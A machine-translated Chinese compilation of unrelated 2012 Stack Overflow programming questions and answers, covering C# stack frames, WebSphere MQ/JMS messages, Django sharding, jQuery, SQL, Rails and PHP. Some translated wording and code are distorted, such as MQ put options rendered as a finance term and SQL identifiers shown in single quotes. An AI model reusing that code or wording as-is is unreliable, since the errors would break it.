[来自 Android 开源项目的 Embedded-vm-control](http://milk.com/kodebase/dalvik-docs-mirror/docs/embedded-vm-control.html)

[来自 developer.android.com 的 Android 2.2 注释](http://developer.android.com/about/versions/android-2.2.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-04T06:41:36.607

可以在每个应用程序的基础上禁用 JIT 编译器，默认值为 false，`android:vmSafeMode`通过添加 标签如果您怀疑 JIT 编译导致您的应用程序行为不正确，这可能很有用`android:vmSafeMode="true"`。`application``AndroidManifest.xml`

我希望这将有助于更多地了解`android:vmSafeMode`

# c# - 获取调用通用函数的类/方法名

> ID：11782255
> 
> 赞同：0
> 
> 时间：2012-08-02T16:56:19.973
> 
> 标签：c#, .net, visual-studio-2010, logging, typeof

我不太确定如何最好地问这个问题，所以请随时编辑......

我有一个“实用程序”类，其中包含在我的应用程序中使用的通用功能。我的一种方法记录这样的异常：

```
internal static void logExeption(Type typeOfClass, string methodName, Exception exeption )
 {
   //Do some logging here
 } 
```

然后，每当我捕获到这样的异常时，我想在整个应用程序中调用它：

```
try{
  //perform some action
}
catch(Exception ex)
{
Utils.logExeption(this.GetType(), System.Reflection.MethodBase.GetCurrentMethod().Name, ex);
 } 
```

我想知道是否有一种方法可以避免传入前两个参数，而只需找出异常源自**logException**方法的类/方法的上下文。从长远来看，这将使我的事情变得更清洁。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T17:02:35.637

所以你要确定调用对象和函数。虽然不推荐，但可以实现。使用 System.Diagnostics.StackTrace 遍历堆栈；然后将适当的 StackFrame 提升一级。然后通过在该 StackFrame 上使用 GetMethod() 确定哪个方法是调用者。请注意，构建堆栈跟踪可能是一项昂贵的操作，并且您的方法的调用者可能会掩盖事物的真正来源。

```
StackFrame frame = new StackFrame(1);
MethodBase method = frame.GetMethod();
string message = String.Format("{0}.{1} : {2}",
method.DeclaringType.FullName, method.Name, message);
Console.WriteLine(message); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T17:54:56.380

请注意，`frame.GetMethod().DeclaringType`可以返回：前一段时间，我只在使用[NLog logger](http://nlog-project.org/) ( )**发布**`null`我的应用程序时遇到了这个问题。具体情况记不清了。顺便说一句，这是[已知问题](http://nlog.codeplex.com/workitem/6999)。**`GetCurrentClassLogger`**

 **[Apache log4net](http://logging.apache.org/log4net/)中有一个有趣的技巧，它允许检测调用者信息（类、方法等）。

请看一下：

1.  `LocationInfo`class ( [source](https://github.com/apache/logging-log4net/blob/master/src/Core/LocationInfo.cs) ) - 调用者位置信息的内部表示。

    ```
     public class LocationInfo
     {
         ...

         public LocationInfo(Type callerStackBoundaryDeclaringType)
         {
             // Here is the trick. See the implementation details here.
         }

         ...
     } 
    ```

2.  `LogImpl`类（[源代码](https://github.com/apache/logging-log4net/blob/master/src/Core/LogImpl.cs)） - 记录器实现类 - ILogger 接口的包装器 - 要做到这一点，**它不能被子类**化！

    ```
     public class LogImpl : LoggerWrapperImpl, ILog
     {
         ...
         public LogImpl(ILogger logger) : base(logger)
         {
             ...
         }

         /// <summary>
         /// The fully qualified name of this declaring type not the type of any subclass.
         /// </summary>
         private readonly static Type ThisDeclaringType = typeof(LogImpl);

         virtual public void Error(object message, Exception exception)
         {
             Logger.Log(ThisDeclaringType, m_levelError, message, exception);
         }

         ...
     } 
    ```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:03:06.903

您可以使用[StackTrace 类](http://msdn.microsoft.com/en-us/library/System.Diagnostics.StackTrace.aspx)。请参阅与您的问题非常相似的示例。**

# .net - 如何在 .NET 中通过 MQ 发送 JMS 消息？

> ID：11782260
> 
> 赞同：1
> 
> 时间：2012-08-02T16:56:36.993
> 
> 标签：.net, jms, websphere, ibm-mq

我正在研究可以被描述为自定义 WMQ 消息路由器/转发器的东西。目前，我在处理通过 MQ 发送的 JMS 消息时遇到了一些非常令人困惑的问题。我能够通过 JMS（使用 MQ 作为传输）接收从 Java 应用程序发送的消息，但我无法将消息发送到在 JMS 端点上侦听的 Java 应用程序。

我有一个测试 servlet 和消息驱动 bean - 两者都托管在 WebSphere Application Server 7.0 中（WebSphere MQ 7.0 用于消息传输）。Servlet 能够与 bean 通信，但如果我将转发器放在它们之间（通过重新配置 servlet 以与转发器通信，转发器将重建消息并将它们转发到 bean），bean 将无法处理请求。我在 WAS 日志中有这个错误：

```
[8/2/12 14:38:51:359 CEST] 00000031 SibMessage    W   [:] CWSJY0003W: JMSCC0110: An exception '
                       Message : java.lang.NullPointerException
                         Class : class java.lang.NullPointerException
                         Stack : com.ibm.msg.client.wmq.internal.messages.WMQMessageBase._parseMcdFolder(WMQMessageBase.java:445)
                               : com.ibm.msg.client.wmq.internal.messages.WMQReceiveMarshal.constructProviderMessageFromRFH2(WMQReceiveMarshal.java:341)
                               : com.ibm.msg.client.wmq.internal.messages.WMQReceiveMarshal.createProviderMessage(WMQReceiveMarshal.java:447)
                               : com.ibm.msg.client.wmq.internal.messages.WMQReceiveMarshal.exportProviderMessage(WMQReceiveMarshal.java:607)
                               : com.ibm.msg.client.wmq.internal.WMQConsumerShadow.getMsg(WMQConsumerShadow.java:1115)
                               : com.ibm.msg.client.wmq.internal.WMQSyncConsumerShadow.receive(WMQSyncConsumerShadow.java:334)
                               : com.ibm.msg.client.wmq.internal.WMQSession.loadMessageReference(WMQSession.java:1082)
                               : com.ibm.msg.client.jms.internal.JmsSessionImpl.consume(JmsSessionImpl.java:2847)
                               : com.ibm.msg.client.jms.internal.JmsSessionImpl.run(JmsSessionImpl.java:2549)
                               : com.ibm.mq.jms.MQSession.run(MQSession.java:860)
                               : com.ibm.mq.connector.inbound.WorkImpl.run(WorkImpl.java:172)
                               : com.ibm.ejs.j2c.work.WorkProxy.run(WorkProxy.java:399)
                               : com.ibm.ws.util.ThreadPool$Worker.run(ThreadPool.java:1604)
[8/2/12 14:38:51:781 CEST] 00000031 SibMessage    W   [:] CWSJY0003W: MQJCA4004: Message delivery to an MDB 'XXX' failed with exception: 'null' 
```

出现此错误后，消息端点会自动暂停。

我使用 RFHUtils 来获取 JMS 和我的应用程序发送的消息并比较它们 - UI 没有真正的区别（除了不同的传递模式，但这是另一回事）但是当我将消息保存到文件并比较它们时，我看到了这种差异（只是第一个 RFH2 文件夹）：

通过 JMS 直接发送：

```
<mcd><Msd>jms_text</Msd></mcd> 
```

通过我的应用发送：

```
<mcd><Msd dt="string" >jms_text</Msd></mcd> 
```

RFH2 中的所有元素也包含类型。文件夹中的元素`jms`顺序不同，但根据例外情况，问题应直接与`mcd`文件夹有关。我不确定如何更好地诊断问题 - 我尝试为 JMS 配置[跟踪](http://publib.boulder.ibm.com/infocenter/wmqv7/v7r1/index.jsp?topic=/com.ibm.mq.doc/jm10770_.htm)，但我不知道如何为 WAS 执行此操作（我在星期二第一次使用 WAS）。标准 MQ 跟踪不提供更多信息。

我的 .NET 代码（使用 MQ 客户端 7.5 - amqmdnet.dll 7.5.0.0 的 WMQ API）非常复杂，但通常会：

接收者

*   在访问时`MQMessage`通过标准`Get`调用接收消息（无特殊获取选项）`MQQueue``MQOO_INPUT_AS_Q_DEF`
*   从收到的所有消息头中读取`MQMessage`
*   用于`GetPropertyNames("%")`获取所有消息属性的名称
*   用于`GetObjectProperty`获取每个属性的值
*   如果消息格式是`MQSTR`读取正文，`ReadString`否则由`ReadBytes`

发件人

*   创建`MQMessage`
*   设置接收到的所有有意义的消息头`MQMessage`——例如`MessageId`，`ReplyToQueue`名称和其他一些不被复制——而是使用新的或正确的值。
*   `MQMessage`通过使用设置接收到的所有属性`SetObjectProperty`- 此步骤包含一些魔法，因为 .NET API 不一致并且从返回的值类型`GetObjectProperty`并不总是被接受`SetObjectProperty`- 通常我接收`String`但我必须通过`int`或`long`（例如：JmsDeliveryMode、JmsPriority 或 JmsTimestamp）。此步骤还覆盖 JmsDestination 和 JmsReplyTo 的目的地
*   通过`WriteString`或编写消息正文`WriteBytes`
*   `Put``MQQueue`要访问的消息`MQOO_OUTPUT`（没有特殊的看跌期权）

我不手动创建 RFH2 结构 - 我让 MQ 基础设施来处理它。所以我的问题是：如何从 .NET 创建有效的 JMS 消息，该消息将被消息驱动 bean 接受？

注意：我不想使用 IBM.XMS - 这个决定是很久以前做出的，因为 IBM 知识库中的一些文章描述了 XMS 和 WMQ 的优缺点。我需要同时支持 JMS 和非 JMS 消息传递。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T10:53:20.387

在启用[WebSphere 跟踪](http://www-01.ibm.com/support/docview.wss?uid=swg21199176)并使用[Java Decompiler](http://java.decompiler.free.fr/?q=jdgui)检查一些 WebSphere .jar 包后，我偶然发现了错误的原因。

跟踪显示了将哪些值传递给失败的`_parseMcdFolder`方法：

```
[8/3/12 12:16:00:199 CEST] 0000003a  > UOW= source=com.ibm.msg.client.wmq.internal.messages.WMQMessageBase method=_parseMcdFolder(String,String,String) (com.ibm.msg.client.wmq.internal.messages.WMQMessageBase) [:] org=IBM prod=WebSphere component=Application Server thread=[WMQJCAResourceAdapter : 0]
          Entry parm0=<mcd><Msd dt="string" >jms_text</Msd></mcd>  parm1=jms_text parm2=<null>
[8/3/12 12:16:00:199 CEST] 0000003a  3 UOW= source=com.ibm.msg.client.jms.internal.JmsSessionImpl org=IBM prod=WebSphere component=Application Server thread=[WMQJCAResourceAdapter : 0]
          (com.ibm.msg.client.jms.internal.JmsSessionImpl) [:/50d450d4] Caught exception: java.lang.NullPointerException in class: com.ibm.msg.client.jms.internal.JmsSessionImpl method: run() <exitIndex: 2>
[8/3/12 12:16:00:199 CEST] 0000003a  1 UOW= source=com.ibm.msg.client.jms.internal.JmsSessionImpl org=IBM prod=WebSphere component=Application Server thread=[WMQJCAResourceAdapter : 0]
          (com.ibm.msg.client.jms.internal.JmsSessionImpl) [:/50d450d4] Tracing exception:
java.lang.NullPointerException
    at com.ibm.msg.client.wmq.internal.messages.WMQMessageBase._parseMcdFolder(WMQMessageBase.java:445)
    at com.ibm.msg.client.wmq.internal.messages.WMQReceiveMarshal.constructProviderMessageFromRFH2(WMQReceiveMarshal.java:341)
    at com.ibm.msg.client.wmq.internal.messages.WMQReceiveMarshal.createProviderMessage(WMQReceiveMarshal.java:447)
    at com.ibm.msg.client.wmq.internal.messages.WMQReceiveMarshal.exportProviderMessage(WMQReceiveMarshal.java:607)
    at com.ibm.msg.client.wmq.internal.WMQConsumerShadow.getMsg(WMQConsumerShadow.java:1115)
    at com.ibm.msg.client.wmq.internal.WMQSyncConsumerShadow.receive(WMQSyncConsumerShadow.java:334)
    at com.ibm.msg.client.wmq.internal.WMQSession.loadMessageReference(WMQSession.java:1082)
    at com.ibm.msg.client.jms.internal.JmsSessionImpl.consume(JmsSessionImpl.java:2847)
    at com.ibm.msg.client.jms.internal.JmsSessionImpl.run(JmsSessionImpl.java:2549)
    at com.ibm.mq.jms.MQSession.run(MQSession.java:860)
    at com.ibm.mq.connector.inbound.WorkImpl.run(WorkImpl.java:172)
    at com.ibm.ejs.j2c.work.WorkProxy.run(WorkProxy.java:399)
    at com.ibm.ws.util.ThreadPool$Worker.run(ThreadPool.java:1604) 
```

所以传递给的参数`_parseMcdFolder`是：

```
parm0=<mcd><Msd dt="string" >jms_text</Msd></mcd>  parm1=jms_text parm2=<null> 
```

我反编译了其中存储的WMQ资源适配器包`%WAS_INSTALL%\lib\WMQ\ra\wmq.jmsra.rar`，查看了`_parseMcdFolder`方法。令人惊讶的是，异常报告的行和方法代码不对应（还有另一种方法）。该方法的代码也应该正确解析传递的参数。

过了一会儿，我检查了整个 WAS 安装目录，发现有两次解压的资源适配器 - 一次在根`InstalledComponents`目录中，第二次在`InstalledComponents`服务器配置文件的目录中。**这些资源适配器有不同的版本：**

*   全球：7.0.1.4-k701-104-110104
*   配置文件：7.0.0.0-k700-L080820

反编译版本 7.0.0.0-k700-L080820 的代码后，我发现确实有一个错误 - 访问未初始化的消息：

```
static WMQMessage _parseMcdFolder(String s, String fbClass, String forcedMessageClass)
    throws JMSException
{
    WMQMessage newMessage = null;

    // 350+ lines of code trying to parse s and initialize newMessage
    // but no fallback so newMessage could be null after the processing

    newMessage.isNullMessage = isNullMsgFlag;  // Line 445 - BOOM!
    return newMessage;
} 
```

此错误已在适配器的某些后续版本中修复，但未传达，因为我没有找到与此问题相关的任何文档。

使用较新的适配器版本后，问题得到解决（实际上我只是转移到另一个问题）。

# sql - 如何复制一个表 100 次并将其添加回原始表

> ID：11782262
> 
> 赞同：0
> 
> 时间：2012-08-02T16:56:45.877
> 
> 标签：sql

我刚开始使用 SQL，需要执行以下任务。1) 首先，我需要复制一张表 100 次。对于所有这些重复的表，我想保持其内容不变。但我也想将主键更新一个。2）其次，我想将所有这些重复的表逐行连接在一起，并将它们逐行连接到原始表。

示例：原始表格如下所示：

身份证类别

1个

2乙

… …</p>

26 Z

我想复制这个表，并将其连接到原始表。我想保持除主键（此处为ID）以外的列不变，并且每次将主键更新一个。我想得到：

身份证类别

1个

2乙

...

26 Z

27个

...

52 Z

这个怎么做？谢谢！

# javascript - 在javascript中获取数组子索引的便捷方法

> ID：11782265
> 
> 赞同：3
> 
> 时间：2012-08-02T16:57:02.837
> 
> 标签：javascript

有没有一种方便的方法可以从这个数组中获取前 n 个索引：

```
var alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']; 
```

并将其存储在另一个数组中，比如说`alphabet2 = ['a','b','c'];`不必用循环蛮力？谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T16:59:11.847

使用[方法](https://developer-new.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/slice)：[_`slice`](https://developer-new.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/slice)

```
> var alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];
> alphabet.slice(0,3)
["a", "b", "c"] 
```

# objective-c - UIScrollView 比 VC 长

> ID：11782269
> 
> 赞同：1
> 
> 时间：2012-08-02T16:57:10.753
> 
> 标签：objective-c, ios

我一直在处理一些`UIScrollView`比它们包含的视图控制器更长的对象（这在故事板中）。现在，如果我想移动最初未显示的对象，我必须同时调整视图控制器和滚动视图的大小。我还必须这样做才能将新对象添加到最初未显示的区域。我知道我可以用尺寸检查器做这些事情，但如果我这样做了，我就无法判断布局是什么样子。

**还有另一种方法可以做到这一点吗？**我还没有找到一种方法使滚动视图在情节提要/IB 中“滚动”。以这种方式进行布局有点痛苦。

# jquery - Jquery回调函数问题

> ID：11782271
> 
> 赞同：0
> 
> 时间：2012-08-02T16:57:21.697
> 
> 标签：jquery

我正在尝试使用回调函数创建悬停效果。似乎只能在回调函数上触发效果，而不能在init悬停上触发。我想知道这里是否有人可以帮助我。非常感谢。

```
$("img").live("hover", function () {
    // hover in
    $(this).css("z-index", 1);
    $(this).animate({
        height: "35%",
        width: "35%",
        left: "-=50",
        top: "-=50"
    }, "fast");
}, function () { //only the following codes will be triggered.
    // hover out
    $(this).css("z-index", 0);
    $(this).animate({
        height: "15%",
        width: "15%",
        left: "+=50",
        top: "+=50"
    }, "fast");
}); 
```

img 是通过 ajax 调用生成的，不确定是否相关

```
<div id='image_layout'>
    <img src='a.jpg' />
    <img src='b.jpg' />
    <img src='c.jpg' />
</div> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:01:17.727

`live()`已弃用，它并没有真正那样工作，但如果您使用的是 jQuery 1.7+，您应该使用`on()`将事件委托给最近的非动态父级，我将`document`在示例中使用，您将替换`document`为最接近未使用 Ajax 插入的图像的父级，可能是`#image_layout`如果该元素未动态插入：

```
$(document).on({
    mouseenter: function() {
        $(this).css("z-index", 1).animate({
                height: "35%",
                width: "35%",
                left: "-=50",
                top: "-=50"
            }, "fast");
    },
    mouseleave: function() {
        $(this).css("z-index", 0).animate({
                height: "15%",
                width: "15%",
                left: "+=50",
                top: "+=50"
            }, "fast");
    }
}, "img"); 
```

另一方面，`+=`在你的动画中使用和百分比在很多情况下只会让你感到悲伤。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:01:47.700

从 jQuery 1.7 开始，不推荐使用 .live() 方法。使用 .on() 附加事件处理程序。旧版本 jQuery 的用户应该使用 .delegate() 而不是 .live()。

试一下！

您的参数也错误，第二个参数应该是数据 nog 某种回调，请参阅更多信息：[http ://api.jquery.com/live/](http://api.jquery.com/live/)

# algorithm - 使用键将数据从平面文件重新组合到散列的算法

> ID：11782272
> 
> 赞同：2
> 
> 时间：2012-08-02T16:57:26.653
> 
> 标签：algorithm, parsing

我经常遇到这种情况。我有一批这种格式的数据（存储在 CSV、XML 中，没关系）：

```
key1|value1
key1|value2
key1|value3
key2|value4
key2|value5
etc. 
```

并且需要能够以这种形式处理它：

```
data[key1] => [value1, value2, value3]
data[key2] => [value4, value5]
etc. 
```

从 A 转换为 B 的最佳方法是什么？我通常像这样循环遍历列表（伪代码），但我不喜欢我必须重复我的数组构建代码。

```
data = []
values = []
currentKey = ""
foreach (line in inputData) {
    key, value = split(line)
    if ((currentKey != "") and (currentKey != key)) {
        data[currentKey] = values
        values = []
    }
    currentKey = key
    values.add(value)
}
// this is the part I don't like, but it's necessary to capture the last group
data[currentKey] = values 
```

我没有特别指定一种语言，因为我必须至少在 Javascript、C#、Perl 和 PHP 中这样做。如果有特定于语言的解决方案会很棒，但我真的在寻找最有效的通用算法方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:53:53.713

这是一个解决方案。首先，创建地图。对于数据文件中的每个条目，找到键和值。检查钥匙是否在地图中。如果不是，则向包含该键的新值的映射添加一个新列表。如果键已经在映射中，只需将新值添加到列表中。

```
def hash = [:]
new File("test.data").eachLine { String line ->
    def (key,value)  = line.split(/\|/)
    hash.get(key, []) << value
}

println hash 
```

它打印出以下地图：

```
[key1:[value1, value2, value3], key2:[value4, value5]] 
```

无需跟踪`currentKey`。

编辑：这是用 Groovy 编写的，但应该在其他语言中非常相似地实现。`hash.get()`返回键的值，或提供的默认值（在上面的代码片段中，一个空列表），而左移 ( `<<`) 运算符向列表中添加一些内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:17:58.507

您可以将代码更改为：

```
data = {}

currentKey = ""

foreach (line in inputData) {

    key, value = split(line)
    if (currentKey != key) {
        data[key] = [] // like data.put(key,new ArrayList<String>()) in java
    }
    data[key].add(value) // like data.get(key).add(value) in java
    currentKey = key
} 
```

# django - 使用 Django 简化分片

> ID：11782274
> 
> 赞同：26
> 
> 时间：2012-08-02T16:57:31.883
> 
> 标签：django, postgresql, sharding, instagram

我有一个基于多个[PostgreSQL](http://www.postgresql.org/)服务器的[Django项目。](https://www.djangoproject.com/)

我希望用户使用[Instagram](http://en.wikipedia.org/wiki/Shard_%28database_architecture%29)使用的相同[分片逻辑](http://instagram-engineering.tumblr.com/post/10853187575/sharding-ids-at-instagram)在这些数据库服务器上进行分片：

用户 ID => 逻辑分片 ID => 物理分片 ID => 数据库服务器 => 架构 => 用户表

*   逻辑分片 ID 直接根据用户 ID（嵌入在用户 ID 中的 13 位）计算得出。
*   从逻辑分片 ID 到物理分片 ID 的映射是硬编码的（在某些配置文件或静态表中）。
*   从物理分片 ID 到数据库服务器的映射也是硬编码的。Instagram 此时使用[Pgbouncer](http://pgfoundry.org/projects/pgbouncer/)来检索与适当数据库服务器的池化数据库连接。
*   每个逻辑分片都存在于自己的[PostgreSQL 模式](http://www.postgresql.org/docs/8.1/static/ddl-schemas.html)中（对于那些不熟悉 PostgreSQL 的人，这*不是*表模式，它更像是一个命名空间，类似于[MySQL 'databases'](http://dev.mysql.com/doc/refman/5.6/en/create-database.html)）。该模式被简单地命名为“shardNNNN”，其中 NNNN 是逻辑分片 ID。
*   最后，查询相应模式中的用户表。

如何在 Django 中尽可能简单地实现这一点？

理想情况下，我希望能够编写 Django 代码，例如：

**获取实例**

```
# this gets the user object on the appropriate server, in the appropriate schema:
user = User.objects.get(pk = user_id) 
```

**获取相关对象**

```
# this gets the user's posted articles, located in the same logical shard:
articles = user.articles 
```

**创建实例**

```
# this selects a random logical shard and creates the user there:
user = User.create(name = "Arthur", title = "King")
# or:
user = User(name = "Arthur", title = "King")
user.save() 
```

**按名称搜索用户**

```
# fetches all relevant users (kings) from all relevant logical shards
# - either by querying *all* database servers (not good)
# - or by querying a "name_to_user" table then querying just the
#   relevant database servers.
users = User.objects.filter(title = "King") 
```

为了让事情变得更加复杂，我使用[流式复制](http://wiki.postgresql.org/wiki/Streaming_Replication)将每个数据库服务器的数据复制到多个从属服务器。master 应该用于写入，slave 应该用于读取。

Django 提供了对[自动数据库路由](https://docs.djangoproject.com/en/dev/topics/db/multi-db/#automatic-database-routing)的支持，这对于上述大多数情况来说可能已经足够了，但是我被困住了，`User.objects.get(pk = user_id)`因为路由器无法访问查询参数，所以它不知道用户 ID 是什么，它只知道该代码正在尝试读取用户模型。

我很清楚，分片可能只应作为最后的优化手段使用，因为它有局限性并且确实使事情变得相当复杂。大多数人不需要分片：优化的主/从架构可以走很长的路。但是让我们假设我*确实*需要分片。

简而言之：**如何尽可能简单地在 Django 中对数据进行分片？**

非常感谢您的帮助。

**笔记**

存在一个非常相似的[问题，但恕我直言，它太笼统了，缺乏精确的例子。](https://stackoverflow.com/questions/4481435/django-data-sharding)我想将事情缩小到我感兴趣的特定分片技术（Instagram 方式）。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-09T15:40:34.163

Mike Clarke 最近在 PyPgDay 上发表了关于 Disqus 如何使用 Django 和 PostgreSQL 对用户进行分片的演讲。他写了[一篇](http://mike-clarke.com/2013/03/sharding-with-the-django-orm/)关于他们如何做到这一点的博客文章。

> 在对 Postgres 数据库进行分片时，可以采用多种策略。在 Disqus，我们选择基于表名进行分片。由于 Django 生成的原始表名可能是 comments_post，我们的分片工具将重写 SQL 以查询表 comments_post_X，其中 X 是基于一致哈希方案计算的分片 ID。所有这些表都存在于单个数据库实例上的单个模式中。

此外，他们发布[了一些代码作为示例应用程序的一部分，](https://github.com/disqus/sharding-example)展示了他们如何分片。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T20:51:17.547

你真的不想处于问这个问题的位置。如果您按用户 ID 进行分片，那么您可能不想按名称搜索。

如果您对数据库进行分片，那么它不会对您的应用程序不可见，并且可能最终需要更改架构。

您可能会发现[SkyTools](https://wiki.postgresql.org/wiki/SkyTools)很有用 - 阅读[PL/Proxy](https://wiki.postgresql.org/wiki/PL/Proxy)。这就是 Skype 对他们的数据库进行分片的方式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-10-13T16:24:13.520

最好使用专业的分片中间件，例如：Apache ShardingSphere。

该项目包含 2 个产品，用于 java 驱动程序的 ShardingSphere-JDBC 和用于所有编程语言的 ShardingSphere-Proxy。它也可以支持 python 和 Django。

# sql - SQL，从选择查询中打印一列

> ID：11782275
> 
> 赞同：4
> 
> 时间：2012-08-02T16:57:32.447
> 
> 标签：sql, tsql

我正在尝试在给用户的消息中从表中打印特定列。这是表格示例

```
StateCode  |   EffectiveDate   |   ExpirationDate
---------------------------------------------
  AK       |   2011-12-31      |   2012-12-31
  AL       |   2011-12-31      |   2015-12-31 
```

依此类推，适用于所有州。我想做的是选择 GETDATE() 不在 EffectiveDate 和 ExpirationDate 之间，并向用户打印一条消息。我的 Select 语句有效，但如果返回多个状态，它会崩溃。有什么办法可以保存列表然后打印出来？或者我可以采取的另一种方法

这是我现在使用的选择查询，适用于返回的 1 个状态

```
DECLARE @missingStates varChar(30)
SET @missingStates = Select StateCode FROM StateTable
   WHERE GETDATE() NOT Between StateTable.EffectiveDate AND StateTable.ExpirationDate

PRINT 'States Missing Effective Models'
PRINT @missingStates 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:01:08.950

您必须将多个值组合成一个变量：

```
DECLARE @missingStates varChar(30)
SET @missingStates = ''

 Select @missingStates = @missingStates + Code + ' ' FROM StateTable
   WHERE GETDATE() NOT Between StateTable.EffectiveDate AND StateTable.ExpirationDate

PRINT 'States Missing Effective Models'
PRINT @missingStates 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:01:21.773

要获得以逗号分隔的状态列表，请执行以下操作：

```
Select case when @missingStates = ''
            then @missingStates = Code 
            else @missingStates = @missingStates + ',' + Code 
       end as states
FROM StateTable
WHERE GETDATE() NOT Between StateTable.EffectiveDate AND StateTable.ExpirationDate 
```

# oracle - Oracle BI 调度程序配置设置

> ID：11782276
> 
> 赞同：0
> 
> 时间：2012-08-02T16:57:43.307
> 
> 标签：oracle, oracle10g, oracle11g

以下是 Oracle BI 中调度程序服务清除设置的默认配置

```
<PurgeInstDays>7</PurgeInstDays>
<PurgeIntervalMinutes>5</PurgeIntervalMinutes> 
```

应该将设置更改为什么，以使记录永远不会被清除并永远存在？我尝试将其更改为 0 但这会立即清理记录。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:03:55.207

我不确定，但删除这些标签可能会有所帮助。关闭调度程序，删除这两个标签并启动调度程序。（尝试前请备份配置文件）。

# ruby-on-rails - 仅显示过去 30 天的对象

> ID：11782278
> 
> 赞同：9
> 
> 时间：2012-08-02T16:57:48.343
> 
> 标签：ruby-on-rails, ruby-on-rails-3

终于设法让我的应用程序列出特定日期下的工作。我现在正在寻找一种仅显示过去 30 天内创建的工作的方法。

目前我展示工作的方法是局部的，看起来像这样：

```
 <% @jobs.group_by{|x| x.created_at.strftime("%d %b. %Y")}.each do |date,jobs_on_that_date| %>

 <section class="date">
   <%= date %>
 </section>

 <section id="top-job">
   <% jobs_on_that_date.each do |job| %>
    <section id="job-wrapper">
      <%= link_to url_with_protocol(@link.job_url), :target => '_blank' do %>
      <section id="job">
        <%= job.title %> - <%= job.company %>
        <%= job.salary %>
        <%= job.location %> 
        <%= job.job_type %>
    </section>
 </section> 
<% end %>
 <% end %>
 </section>
 <% end %> 
```

有没有办法在视图中集成仅显示过去 30 天的工作，或者在控制器中定义它会更好吗？

谢谢！

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-08-02T17:12:23.143

在控制器中做会更好。您在视图中放入的逻辑越少越好。

假设这`@jobs`是 ActiveRecord 查询的结果，`@jobs = @jobs.where('created_at > ?', 30.days.ago)`听起来像是您想要的查询。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-02T17:14:38.163

我认为最好的方法是在模型中，有一个范围。然后你的控制器就可以使用它了。

```
# app/models/job.rb
class Job < ActiveRecord::Base
  # ...
  scope :recent, lambda{ where(['created_at > ?', 30.days.ago]) }
  # ...
end

# app/controllers/jobs_controller.rb
class JobsController < ApplicationController
  def show
    @jobs = Job.recent.group_by(&:created_at)
  end
end

# app/views/jobs/show.html.erb
<% @jobs.each do |date,jobs_on_that_date| %>

 <section class="date">
   <%= date.strftime("%d %b. %Y") %>
 </section>

 etc...

<% end %> 
```

处理控制器和视图的稍微好一点的方法是：

```
# app/controllers/jobs_controller.rb
class JobsController < ApplicationController
  helper_method :recent_jobs

  def show
    # just render...
  end

  protected

  def recent_jobs
    @_jobs ||= Job.recent.group_by(&:created_at)
  end
end

# app/views/jobs/show.html.erb
<% recent_jobs.each do |date,jobs_on_that_date| %>

 etc...

<% end %> 
```

所以没有实例变量复制，你有一个很好的控制器 AP 我可以用来获取你的记录。

您还可以考虑使用装饰器来包装您的作业对象并在那里提供日期格式逻辑。

# php - 用php和mysql动态建表

> ID：11782279
> 
> 赞同：0
> 
> 时间：2012-08-02T16:57:49.423
> 
> 标签：php, mysql, html-table

我一直在阅读一些问答，但仍然没有设法建立我的算法，所以我正在寻求一些关于如何做的帮助/建议。

所以，我有一个 MySQL 表，对于每个 mysql 表行，我想在表中显示它。我希望我的表只有 4 列（这意味着行数是可变的，具体取决于数据库中的数据）。因此，在 html 表的（第 1 行，第 1 列）中，将是来自 db 表第 1 行的数据，来自 db 表第 2 行的 html（第 1 行，第 2 列）数据...（第 2 行，第 1 列）来自 db 表的数据第 5 行，以此类推。

因此，该表将类似于：

> [来自数据库行#1的数据] [来自数据库行#2的数据] [来自数据库行#3的数据] [来自数据库行#4的数据]
> 
> [来自数据库行#5的数据] [来自数据库行#6的数据] [来自数据库行#7的数据] [来自数据库行#8的数据]
> 
> 等等...

这就是我必须从 db 获取数据的内容：

```
function get_albums() {
    $albums = array();

    $albums_query = mysql_query("SELECT 'albums'.'album_id', 'albums'.'role_id', 'albums'.'timestamp', 'albums'.'name', LEFT('albums'.'description',50) as 'description', COUNT('images'.'image_id') as 'image_count'
    FROM 'albums'
    LEFT JOIN 'images'
    ON 'albums'.'album_id' = 'images'.'album_id'
    GROUP BY 'albums'.'album_id'");

    // Loop through all images
    while ($albums_row = mysql_fetch_assoc($albums_query)) {
        // multidimensional array
        $albums[] = array(
                    // associative array
                    'id' => $albums_row['album_id'],
                    'role' => $albums_row['role_id'],
                    'timestamp' => $albums_row['timestamp'],
                    'name' => $albums_row['name'],
                    'description' => $albums_row['description'],
                    'image_count' => $albums_row['image_count']
        );
    }   
    return $albums;
} 
```

要显示该信息：

```
$albums = get_albums();

echo '<table>';
for ($i=0; $i<(count($albums)/4); $i++) {
    echo '<tr>';

    //HERE IS WHERE I'M LOST

    foreach ($albums as $album) {
        echo '<a href="view_album.php?aid=',$album['id'],'">',$album['name'],'</a> (',$album['image_count'],') image(s)<br />',$album['description'],'...';

    }
    echo '</tr>';
}
echo '</table>'; 
```

那么，有什么想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:03:37.463

```
